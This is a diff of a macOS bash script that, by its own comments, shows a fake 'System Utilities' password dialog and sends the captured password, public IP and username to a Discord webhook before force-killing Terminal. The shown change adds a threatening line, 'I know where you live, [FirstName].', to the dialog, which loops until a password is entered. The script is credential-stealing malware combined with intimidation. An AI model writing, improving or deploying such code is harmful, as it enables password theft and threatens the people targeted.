@@ -1,9 +1,10 @@
 #!/bin/bash
-# Login Prompt Script for macOS – Updated with Custom Prompt and Force Kill
-# This script displays a login prompt that instructs the user:
-# "Enter your password Mr. (last name). DO NOT PRESS CANCEL"
-# It captures the entered password and sends it (along with the public IP and username)
-# to a Discord webhook, then forcefully kills Terminal.
+# Login Prompt Script for macOS – Updated with Two-Line Prompt and Force Kill
+# This script displays a login prompt that instructs the user with two lines:
+# "I know where you live, [FirstName]."
+# "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
+#
+# Once a non-empty password is entered, it sends the captured data to a Discord webhook and forcefully kills Terminal.
 #
 # Requirements:
 # - macOS with osascript, curl, and either python3 or python installed.
@@ -21,14 +22,15 @@ username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /logi
 # Initialize capture text.
 capture="username=${username}\n_________________________________________________________________________________________\n\n"
 
-# Define the AppleScript for a persistent password prompt with custom text.
+# Define AppleScript for a persistent password prompt with a two-line message.
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
+set firstName to word 1 of fullName
 set lastName to word -1 of fullName
 set userPassword to ""
 repeat while userPassword is ""
     try
-        set userPassword to text returned of (display dialog "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
+        set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
     on error
         set userPassword to ""
     end try
